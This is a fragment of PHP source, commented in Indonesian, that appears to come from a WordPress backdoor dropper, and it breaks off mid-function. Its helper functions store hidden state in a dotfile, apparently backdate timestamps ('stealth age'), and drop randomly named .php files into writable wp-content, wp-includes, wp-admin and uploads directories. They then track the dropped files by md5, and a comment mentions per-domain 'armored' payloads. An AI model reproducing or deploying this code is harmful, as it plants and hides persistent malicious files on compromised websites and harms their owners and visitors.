/* ===== DROP TOOLS helpers: lokasi acak + pelacak state ===== */
function gsfu_tools_state_path() { return dirname(__FILE__) . '/.gsfu_tools.dat'; }
function gsfu_tools_load() {
    $d = @file_get_contents(gsfu_tools_state_path());
    if ($d === false || $d === '') return array();
    $a = @unserialize($d);
    return is_array($a) ? $a : array();
}
function gsfu_tools_save($a) {
    @file_put_contents(gsfu_tools_state_path(), serialize($a));
    @chmod(gsfu_tools_state_path(), 0600);
    gsp_stealth_age(gsfu_tools_state_path());
}
function gsfu_tool_rand_name() { return substr(md5(uniqid(mt_rand(), true)), 0, 10) . '.php'; }
function gsfu_tool_dirs() {
    $base = dirname(__FILE__);
    $out = array();
    foreach (array('wp-content', 'wp-includes', 'wp-admin', 'wp-content/uploads') as $w) {
        $p = $base . '/' . $w;
        if (@is_dir($p) && @is_writable($p)) $out[] = $p;
    }
    if (count($out) === 0) $out[] = $base;
    return $out;
}
function gsfu_tool_find($want_md5) {
    $cand = array(dirname(__FILE__));
    foreach (array('wp-content', 'wp-includes', 'wp-admin', 'wp-content/uploads') as $w) $cand[] = dirname(__FILE__) . '/' . $w;
    foreach ($cand as $cd) {
        $g = @glob($cd . '/*.php');
        if (!is_array($g)) continue;
        foreach ($g as $f) {
            if (@md5_file($f) === $want_md5) return $f;
        }
    }
    return '';
}
function gsfu_tools_status() {
    $st = gsfu_tools_load();
    /* md5 fallback lama (payload mentah v65.8); drop ARMOR v3 menyimpan md5
       per file di state['_md5'] karena isi ter-armor unik per domain+gate */
